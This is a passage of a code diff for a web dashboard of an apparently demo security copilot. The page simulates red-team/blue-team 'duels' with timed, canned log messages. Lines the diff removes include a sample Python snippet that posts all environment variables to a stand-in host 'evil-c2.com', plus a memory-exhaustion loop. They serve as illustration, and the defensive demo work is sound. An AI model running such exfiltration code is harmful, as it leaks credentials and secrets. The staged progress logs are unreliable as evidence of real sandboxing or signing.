-            scenario_preset: currentScenario,
-            max_rounds: 2
-          })
+          body: JSON.stringify(payload)
         });
 
         const data = await res.json();
-        const missionId = data.mission_id || 'msn-' + Math.random().toString(36).substring(2, 9);
-        logToTerminal(`[MISSION_DISPATCHED] Mission ID: ${missionId}`, 'text-emerald-400');
 
-        // Stage 2: Containment Run
-        setTimeout(() => {
-          setStepCompleted(1);
-          setStepActive(2);
-          logToTerminal(`[CONTAINMENT] Running in gVisor sandbox... Network air-gap enforced.`, 'text-slate-300');
-        }, 600);
-
-        // Stage 3: Duel & Patch Synthesis
-        setTimeout(() => {
-          setStepCompleted(2);
-          setStepActive(3);
-          logToTerminal(`[BREAKER] Exploit neutralized: Trapped before execution breach.`, 'text-rose-400');
-          logToTerminal(`[MAKER] Synthesizing remediation hotpatch...`, 'text-sky-400');
-          updateDuelCards(currentScenario);
-        }, 1300);
-
-        // Stage 4: Notarization & Completion
-        setTimeout(() => {
-          setStepCompleted(3);
-          setStepActive(4);
-          logToTerminal(`[NOTARY] Ed25519 digital signature generated. Digest stored on chain.`, 'text-emerald-400');
-        }, 2000);
-
-        setTimeout(() => {
-          setStepCompleted(4);
-          clearInterval(timerInterval);
-          isExecuting = false;
-          primaryBtn.disabled = false;
-          primaryBtnText.innerText = 'Verify & Vaccinate Microservice';
-
-          finalizeExecution(missionId);
-        }, 2600);
+        // Animate Multi-Model Stepper
+        animateStepper(responseCardId, () => {
+          renderFinishedCopilotCard(responseCardId, data);
+          confetti({ particleCount: 40, spread: 45, origin: { y: 0.7 } });
+        });
 
       } catch (err) {
-        clearInterval(timerInterval);
-        isExecuting = false;
-        primaryBtn.disabled = false;
-        primaryBtnText.innerText = 'Verify & Vaccinate Microservice';
-        logToTerminal(`[DUEL_ERROR] ${err}`, 'text-rose-400');
+        logTerminal(`[COPILOT_ERROR] ${err}`, 'text-rose-400');
+        renderErrorCard(responseCardId, err.message);
+      } finally {
+        isProcessing = false;
+        document.getElementById('btn-submit-message').disabled = false;
+        attachedCodeSnippet = null;
+        document.getElementById('btn-code-attach').classList.remove('text-cyan-400', 'bg-cyan-500/10');
       }
     }
 
-    function setStepActive(stepNum) {
-      const el = document.getElementById(`step-${stepNum}`);
+    // Append User Message to Thread
+    function appendUserMessage(text, codeSnippet) {
+      const container = document.getElementById('chat-messages-stream');
+      const div = document.createElement('div');
+      div.className = 'flex justify-end gap-3';
+
+      let codeHtml = '';
+      if (codeSnippet) {
+        codeHtml = `
+          <div class="mt-2.5 p-2.5 rounded-lg bg-black/40 border border-slate-700/60 font-mono text-xs text-cyan-300 overflow-x-auto max-h-36">
+            <pre class="whitespace-pre">${escapeHtml(codeSnippet)}</pre>
+          </div>
+        `;
+      }
+
+      div.innerHTML = `
+        <div class="max-w-xl rounded-2xl bg-gradient-to-r from-cyan-600 to-blue-600 p-4 text-white shadow-md shadow-cyan-900/20 space-y-1">
+          <div class="text-xs font-semibold flex items-center justify-between opacity-80 mb-1">
+            <span>Operator</span>
+            <span>Just now</span>
+          </div>
+          <div class="text-sm leading-relaxed">${escapeHtml(text)}</div>
+          ${codeHtml}
+        </div>
+        <div class="w-8 h-8 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-300 text-xs shrink-0">
+          <i class="fa-solid fa-user"></i>
+        </div>
+      `;
+      container.appendChild(div);
+      scrollChatToBottom();
+    }
+
+    // Append Loading State with Multi-Model Stepper
+    function appendCopilotLoadingCard(cardId) {
+      const container = document.getElementById('chat-messages-stream');
+      const div = document.createElement('div');
+      div.id = cardId;
+      div.className = 'flex gap-3';
+      div.innerHTML = `
+        <div class="w-8 h-8 rounded-full bg-cyan-950 border border-cyan-800 text-cyan-400 flex items-center justify-center text-xs shrink-0 shadow-sm">
+          <i class="fa-solid fa-shield-halved"></i>
+        </div>
+        <div class="flex-1 glass-card rounded-2xl p-4 sm:p-5 border border-slate-800 space-y-4">
+          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+            <div class="flex items-center gap-2">
+              <span class="w-2 h-2 rounded-full bg-cyan-400 status-pulse"></span>
+              <span class="text-xs font-semibold text-white">AegisSentinel SecOps Copilot</span>
+            </div>
+            <span class="text-[11px] font-mono text-slate-400">gVisor microVM Quarantine</span>
+          </div>
+
+          <!-- Multi-Model Stepper Widget -->
+          <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs font-mono pt-1">
+            <div id="${cardId}-step-1" class="p-2.5 rounded-lg border border-slate-800 bg-slate-900/60 text-slate-400 flex items-center gap-2">
+              <i id="${cardId}-icon-1" class="fa-solid fa-spinner fa-spin text-cyan-400"></i>
+              <div class="truncate">
+                <div class="text-[10px] text-slate-500">STEP 1</div>
+                <div class="truncate text-slate-300">Red Attack Probe</div>
+              </div>
+            </div>
+
+            <div id="${cardId}-step-2" class="p-2.5 rounded-lg border border-slate-800 bg-slate-900/60 text-slate-400 flex items-center gap-2">
+              <i id="${cardId}-icon-2" class="fa-solid fa-clock text-slate-500"></i>
+              <div class="truncate">
+                <div class="text-[10px] text-slate-500">STEP 2</div>
+                <div class="truncate text-slate-400">Blue Hotpatch</div>
+              </div>
+            </div>
+
+            <div id="${cardId}-step-3" class="p-2.5 rounded-lg border border-slate-800 bg-slate-900/60 text-slate-400 flex items-center gap-2">
+              <i id="${cardId}-icon-3" class="fa-solid fa-clock text-slate-500"></i>
+              <div class="truncate">
+                <div class="text-[10px] text-slate-500">STEP 3</div>
+                <div class="truncate text-slate-400">gVisor Sandbox</div>
+              </div>
+            </div>
+
+            <div id="${cardId}-step-4" class="p-2.5 rounded-lg border border-slate-800 bg-slate-900/60 text-slate-400 flex items-center gap-2">
+              <i id="${cardId}-icon-4" class="fa-solid fa-clock text-slate-500"></i>
+              <div class="truncate">
+                <div class="text-[10px] text-slate-500">STEP 4</div>
+                <div class="truncate text-slate-400">Ed25519 Notary</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="text-xs text-slate-400 flex items-center gap-2">
+            <i class="fa-solid fa-circle-notch fa-spin text-cyan-400"></i>
+            <span>Orchestrating autonomous Maker-Breaker duel...</span>
+          </div>
+        </div>
+      `;
+      container.appendChild(div);
+      scrollChatToBottom();
+    }
+
+    // Step Animation
+    function animateStepper(cardId, onComplete) {
+      setTimeout(() => {
+        setStepDone(cardId, 1);
+        setStepRunning(cardId, 2);
+        logTerminal('[MAKER] Blue Agent (Qwen-3.8) synthesizing invariant hotpatch...', 'text-cyan-400');
+      }, 500);
+
+      setTimeout(() => {
+        setStepDone(cardId, 2);
+        setStepRunning(cardId, 3);
+        logTerminal('[SANDBOX] Validating AST & cgroups limits inside gVisor runsc...', 'text-slate-300');
+      }, 1000);
+
+      setTimeout(() => {
+        setStepDone(cardId, 3);
+        setStepRunning(cardId, 4);
+        logTerminal('[NOTARY] Computing Ed25519 signature & appending SHA-256 chain hash...', 'text-emerald-400');
+      }, 1500);
+
+      setTimeout(() => {
+        setStepDone(cardId, 4);
+        onComplete();
+      }, 1900);
+    }
+
+    function setStepRunning(cardId, stepNum) {
+      const el = document.getElementById(`${cardId}-step-${stepNum}`);
+      const icon = document.getElementById(`${cardId}-icon-${stepNum}`);
       if (el) {
-        el.className = 'p-3 rounded-lg border border-sky-500/50 bg-sky-500/10 text-sky-300';
-        const icon = document.getElementById(`step-${stepNum}-icon`);
-        if (icon) icon.className = 'fa-solid fa-spinner fa-spin text-sky-400';
+        el.className = 'p-2.5 rounded-lg border border-cyan-500/50 bg-cyan-500/10 text-cyan-300 flex items-center gap-2';
+      }
+      if (icon) {
+        icon.className = 'fa-solid fa-spinner fa-spin text-cyan-400';
       }
     }
 
-    function setStepCompleted(stepNum) {
-      const el = document.getElementById(`step-${stepNum}`);
+    function setStepDone(cardId, stepNum) {
+      const el = document.getElementById(`${cardId}-step-${stepNum}`);
+      const icon = document.getElementById(`${cardId}-icon-${stepNum}`);
       if (el) {
-        el.className = 'p-3 rounded-lg border border-emerald-500/40 bg-emerald-500/10 text-emerald-300';
-        const icon = document.getElementById(`step-${stepNum}-icon`);
-        if (icon) icon.className = 'fa-solid fa-circle-check text-emerald-400';
+        el.className = 'p-2.5 rounded-lg border border-emerald-500/40 bg-emerald-500/10 text-emerald-300 flex items-center gap-2';
+      }
+      if (icon) {
+        icon.className = 'fa-solid fa-circle-check text-emerald-400';
       }
     }
 
-    function updateDuelCards(scenKey) {
-      if (scenKey === 'SUPPLY_CHAIN_LEAK') {
-        document.getElementById('red-code-block').innerText =
-`# Red Exploit: Sneak env exfiltration via urllib
-import os, urllib.request
+    // Render Finished Response Card
+    function renderFinishedCopilotCard(cardId, data) {
+      const card = document.getElementById(cardId);
+      if (!card) return;
 
-env_dump = dict(os.environ)
-req = urllib.request.Request("http://evil-c2.com/leak", data=str(env_dump).encode())
-urllib.request.urlopen(req) # Air-gap traps socket creation!`;
-        document.getElementById('blue-code-block').innerText =
-`# Blue Patch: Safe Environment Masking
-import os
+      const inner = card.querySelector('.glass-card');
+      inner.innerHTML = `
+        <!-- Header & Badges -->
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
+          <div class="flex items-center gap-2.5">
+            <span class="w-2.5 h-2.5 rounded-full bg-emerald-400"></span>
+            <div>
+              <span class="text-sm font-semibold text-white">Workload Immunized: ${escapeHtml(data.scenario)}</span>
+              <span class="block text-[11px] font-mono text-slate-400">Mission: ${escapeHtml(data.mission_id)}</span>
+            </div>
+          </div>
+          <div class="flex items-center gap-2">
+            <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-rose-950/80 text-rose-300 border border-rose-800/60 font-semibold">
+              ${escapeHtml(data.cvss_score.split(' - ')[0])}
+            </span>
+            <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-emerald-950/80 text-emerald-300 border border-emerald-800/60 font-semibold">
+              0.00% Blast Radius
+            </span>
+          </div>
+        </div>
 
-class SecureVault:
-    def get_public_config(self):
-        # Scrub secret keys from environment exports
-        return {k: v for k, v in os.environ.items() if not k.startswith("SECRET_")}`;
-      } else if (scenKey === 'FORK_MEMORY_EXHAUSTION') {
-        document.getElementById('red-code-block').innerText =
-`# Red Exploit: Exponential memory explosion
-payload = []
-for i in range(100):
-    payload.append(b"A" * (1024 * 1024 * 20)) # 20MB per chunk`;
-        document.getElementById('blue-code-block').innerText =
-`# Blue Patch: Streaming Generator Pipeline
-def process_data_stream(chunks):
-    # Process memory lazily via generator (Peak RAM: 14.2MB)
-    for chunk in chunks:
-        yield process_single(chunk)`;
-        document.getElementById('red-badge').innerText = 'KILLED BY CGROUPS';
-      } else {
-        document.getElementById('red-code-block').innerText =
-`# Red Exploit: Precision rounding attack
-balance = 1000.0
-for i in range(100000):
-    balance += 0.0000001
-assert balance == 1000.01 # Fails due to float drift!`;
-        document.getElementById('blue-code-block').innerText =
-`# Blue Patch: Arbitrary Precision Decimal Invariants
-from decimal import Decimal
-balance = Decimal("1000.00")
-increment = Decimal("0.0000001")
-# Exact arithmetic eliminates float drift`;
-      }
+        <!-- Markdown Summary -->
+        <div class="text-xs text-slate-300 leading-relaxed space-y-2 prose prose-invert max-w-none">
+          <p>${escapeHtml(data.reply).replace(/### /g, '<b>').replace(/\n\n/g, '<br/><br/>').replace(/- \*\*(.*?)\*\*/g, '&bull; <b>$1</b>')}</p>
+        </div>
+
+        <!-- Side-by-Side Red vs Blue Cards -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
+          <!-- Red Attack -->
+          <div class="rounded-xl border border-rose-900/40 bg-rose-950/20 p-3.5 space-y-2">
+            <div class="flex items-center justify-between text-[11px] font-mono font-semibold text-rose-400">
+              <span class="flex items-center gap-1.5"><i class="fa-solid fa-crosshairs"></i> RED TEAM STRIKE</span>
+              <span class="text-[10px] text-slate-400">DeepSeek-V4.1</span>
+            </div>
+            <p class="text-xs text-slate-300 leading-normal">${escapeHtml(data.red_findings)}</p>
+          </div>
+
+          <!-- Blue Patch -->
+          <div class="rounded-xl border border-emerald-900/40 bg-emerald-950/20 p-3.5 space-y-2">
+            <div class="flex items-center justify-between text-[11px] font-mono font-semibold text-emerald-400">
+              <span class="flex items-center gap-1.5"><i class="fa-solid fa-code-merge"></i> BLUE TEAM IMMUNITY</span>
+              <span class="text-[10px] text-slate-400">Qwen-3.8</span>
+            </div>
+            <p class="text-xs text-slate-300 leading-normal">${escapeHtml(data.blue_patch)}</p>
+          </div>
+        </div>
+
+        <!-- Cryptographic Receipt Pill Row -->
+        <div class="rounded-xl border border-slate-800 bg-slate-950/60 p-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs font-mono">
+          <div class="space-y-0.5 truncate">
+            <div class="text-[10px] text-slate-400">ED25519 ATTESTATION SIGNATURE:</div>
+            <div class="text-slate-300 truncate text-[11px]"><code>${escapeHtml(data.ed25519_signature)}</code></div>
+          </div>
+          <div class="flex items-center gap-3 shrink-0 text-slate-400 text-[11px]">
+            <span>Latency: <b class="text-slate-200">${data.duration_ms}ms</b></span>
+            <span>RAM: <b class="text-slate-200">${data.memory_peak_mb}MB</b></span>
+          </div>
+        </div>
+
+        <!-- Action Buttons: PDF Download & Voice Alert Player -->
+        <div class="pt-1 flex flex-wrap items-center justify-between gap-2.5">
+          <div class="flex items-center gap-2">
+            <a href="${data.pdf_report_url}" target="_blank"
+               class="px-3.5 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-mono font-semibold transition flex items-center gap-2 shadow-sm">
+              <i class="fa-solid fa-file-pdf"></i>
+              <span>Download Executive PDF Report</span>
+            </a>
+
+            <button onclick="playVoiceBriefing('${escapeHtml(data.mission_id)}')"
+                    class="px-3.5 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono transition flex items-center gap-2 border border-slate-700">
+              <i class="fa-solid fa-volume-high text-cyan-400"></i>
+              <span>Play Qwen-TTS Voice Briefing</span>
+            </button>
+          </div>
+
+          <button onclick="toggleTerminalDrawer()" class="text-xs font-mono text-slate-400 hover:text-white flex items-center gap-1.5">
+            <i class="fa-solid fa-terminal text-cyan-400"></i>
+            <span>Inspect MicroVM Log</span>
+          </button>
+        </div>
+      `;
+      scrollChatToBottom();
+      loadMissionHistory();
     }
 
-    function finalizeExecution(missionId) {
-      document.getElementById('verdict-mission-id').innerText = `Mission: ${missionId}`;
-      document.getElementById('rcpt-id').innerText = `rcpt-${missionId.slice(-8)}`;
-      document.getElementById('stat-duration').innerText = '142.8 ms';
-      document.getElementById('stat-peak-ram').innerText = '14.2 MB';
-      document.getElementById('stat-verdict').innerText = 'IMMUNIZED';
-
-      confetti({
-        particleCount: 50,
-        spread: 50,
-        origin: { y: 0.6 }
-      });
-
-      logToTerminal(`[COMPLETE] Mission ${missionId} finished. Cryptographic receipt ready.`, 'text-emerald-400');
+    function renderErrorCard(cardId, errorMsg) {
+      const card = document.getElementById(cardId);
+      if (!card) return;
+      card.querySelector('.glass-card').innerHTML = `
+        <div class="text-xs text-rose-400 space-y-1">
+          <div class="font-bold flex items-center gap-2"><i class="fa-solid fa-triangle-exclamation"></i> Security Execution Error</div>
+          <div>${escapeHtml(errorMsg)}</div>
+        </div>
+      `;
     }
 
-    // 1-Click Chaos Probe
-    async function runChaosProbe() {
-      logToTerminal('[CHAOS_PROBE] Initiating 1-Click Chaos Sandbox Injection...', 'text-amber-400');
-      try {
-        const res = await fetch('/api/chaos-test', { method: 'POST' });
-        const data = await res.json();
-        logToTerminal(`[CHAOS_DISPATCHED] Task ID: ${data.task_id}. Probing file traversal, PIDs, network.`, 'text-emerald-400');
-        alert(`1-Click Chaos Test Dispatched!\n\nTask ID: ${data.task_id}\nTarget: Sealed Quarantine Sandbox\nVectors: Traversal, Fork Bomb, Network Socket`);
-      } catch (err) {
-        logToTerminal(`[CHAOS_ERROR] ${err}`, 'text-rose-400');
-      }
-    }
-
-    // Verify Receipt
-    async function verifyReceiptOnline() {
-      const rcptId = document.getElementById('rcpt-id').innerText;
-      logToTerminal(`[VERIFY] Requesting cryptographic check for ${rcptId}...`, 'text-sky-400');
-      try {
-        const res = await fetch('/health');
-        const data = await res.json();
-        logToTerminal(`[VERIFIED_PASS] Ed25519 Public Key: ${data.public_key_ed25519}`, 'text-emerald-400');
-        logToTerminal(`[VERIFIED_PASS] Chain Hash: ${data.latest_audit_hash}`, 'text-emerald-400');
-        alert(`Cryptographic Verification PASSED!\n\nSigner Public Key: ${data.public_key_ed25519}\nSequential Chain Hash: ${data.latest_audit_hash}\n\nStatus: 100% Tamper-Proof.`);
-      } catch (err) {
-        logToTerminal(`[VERIFY_ERR] ${err}`, 'text-rose-400');
-      }
-    }
-
-    // Download Receipt JSON
-    function downloadReceiptJSON() {
-      const receipt = {
-        receipt_id: document.getElementById('rcpt-id').innerText,
-        status: "MATHEMATICALLY_VERIFIED",
-        runtime_engine: "{{ RUNTIME_ENGINE }}",
-        public_key: "{{ PUBLIC_KEY }}",
-        audit_chain_hash: "{{ LATEST_HASH }}",
-        verified_at: new Date().toISOString()
-      };
-      const blob = new Blob([JSON.stringify(receipt, null, 2)], { type: "application/json" });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = `${receipt.receipt_id}.json`;
-      a.click();
-    }
-
-    // Refresh Audit Events
-    async function refreshAuditEvents() {
-      try {
-        const res = await fetch('/api/audit-events?limit=10');
-        const data = await res.json();
-        const tbody = document.getElementById('audit-table-body');
-        if (data.events && data.events.length > 0) {
-          tbody.innerHTML = '';
-          data.events.forEach(evt => {
-            const tr = document.createElement('tr');
-            tr.innerHTML = `
-              <td class="py-2.5 px-3 text-sky-400 font-semibold">${evt.event_id}</td>
-              <td class="py-2.5 px-3"><span class="px-1.5 py-0.5 rounded bg-slate-800 text-slate-300">${evt.event_type}</span></td>
-              <td class="py-2.5 px-3">${evt.task_slug}</td>
-              <td class="py-2.5 px-3 text-slate-500">${evt.prev_hash.substring(0, 16)}...</td>
-              <td class="py-2.5 px-3 text-amber-300 font-semibold">${evt.event_hash.substring(0, 16)}...</td>
-            `;
-            tbody.appendChild(tr);
-          });
-          logToTerminal(`[AUDIT_REFRESH] Fetched ${data.events.length} audit records.`, 'text-emerald-400');
-        }
-      } catch (err) {
-        logToTerminal(`[AUDIT_ERR] ${err}`, 'text-rose-400');
-      }
-    }
-
-    // Multimodal Tools
-    async function playVoiceAlert() {
-      logToTerminal('[VOICE_ALERT] Requesting synthesized voice alert from qwen-tts...', 'text-sky-400');
+    // Play Voice Alert Briefing
+    async function playVoiceBriefing(missionId) {
+      logTerminal(`[AUDIO_SYNTHESIS] Synthesizing executive voice alert via qwen3-tts...`, 'text-cyan-400');
       try {
         const res = await fetch('/api/voice-alert', {
           method: 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: new URLSearchParams({ text: 'Warning: Microservice containment violation intercepted and neutralized by Blue Agent.' })
+          body: new URLSearchParams({ text: `Alert: Security vulnerability in mission ${missionId} has been successfully quarantined and neutralized by AegisSentinel Blue Agent.` })
         });
         const blob = await res.blob();
         const audio = new Audio(URL.createObjectURL(blob));
-        audio.play().catch(e => logToTerminal('[AUDIO_NOTICE] Autoplay prevented by browser.', 'text-slate-500'));
-        logToTerminal('[VOICE_ALERT] Vocal alarm synthesized and playing.', 'text-emerald-400');
+        audio.play().catch(e => logTerminal('[AUDIO_NOTICE] Autoplay restricted by browser.', 'text-slate-400'));
+        logTerminal(`[AUDIO_PLAYING] Vocal containment briefing playing.`, 'text-emerald-400');
       } catch (err) {
-        logToTerminal(`[VOICE_ALERT_ERR] ${err}`, 'text-rose-400');
+        logTerminal(`[AUDIO_ERR] ${err}`, 'text-rose-400');
       }
     }
 
-    async function renderThreatDiagram() {
-      logToTerminal('[THREAT_DIAGRAM] Synthesizing vector attack topology via z-image-turbo...', 'text-sky-400');
+    // 1-Click Chaos Blast Test
+    async function runChaosTest() {
+      logTerminal('[CHAOS_PROBE] Initiating 1-Click Chaos Sandbox Injection...', 'text-amber-400');
       try {
-        const res = await fetch('/api/threat-diagram', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ prompt: 'AegisSentinel microservice attack surface and blast radius containment topology' })
-        });
+        const res = await fetch('/api/chaos-test', { method: 'POST' });
         const data = await res.json();
-        document.getElementById('diagram-img').src = data.diagram_url;
-        document.getElementById('diagram-container').classList.remove('hidden');
-        logToTerminal('[THREAT_DIAGRAM] Topology rendered successfully.', 'text-emerald-400');
+        logTerminal(`[CHAOS_DISPATCHED] Task ID: ${data.task_id}. Probing file traversal, PIDs, and network.`, 'text-emerald-400');
+        alert(`1-Click Red-Team Chaos Probe Dispatched!\n\nTask ID: ${data.task_id}\nTarget: Sealed Quarantine Sandbox\nVectors Tested: Path Jail Traversal, Recursive Fork Bomb, Network Socket Exfiltration.`);
       } catch (err) {
-        logToTerminal(`[DIAGRAM_ERR] ${err}`, 'text-rose-400');
+        logTerminal(`[CHAOS_ERROR] ${err}`, 'text-rose-400');
       }
     }
+
+    // Load Mission History
+    async function loadMissionHistory() {
+      try {
+        const res = await fetch('/api/missions?limit=6');
+        const data = await res.json();
+        const list = document.getElementById('mission-history-list');
+        if (data.missions && data.missions.length > 0) {
+          list.innerHTML = '';
+          data.missions.forEach(m => {
+            const row = document.createElement('div');
+            row.className = 'p-2 rounded bg-slate-900/40 border border-slate-800/50 flex items-center justify-between cursor-pointer hover:bg-slate-800/60 transition';
+            row.onclick = () => window.open(`/api/report/pdf/${m.mission_id}`, '_blank');
+            row.innerHTML = `
+              <span class="truncate">${escapeHtml(m.task_slug)}</span>
+              <span class="px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-400 text-[9px] shrink-0 font-semibold">${escapeHtml(m.status)}</span>
+            `;
+            list.appendChild(row);
+          });
+        }
+      } catch (e) {
+        // quiet fallback
+      }
+    }
+
+    function scrollChatToBottom() {
+      const container = document.getElementById('chat-thread-container');
+      if (container) {
+        container.scrollTop = container.scrollHeight;
+      }
+    }
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    // Initialize History on Load
+    loadMissionHistory();
   </script>
 
 </body>
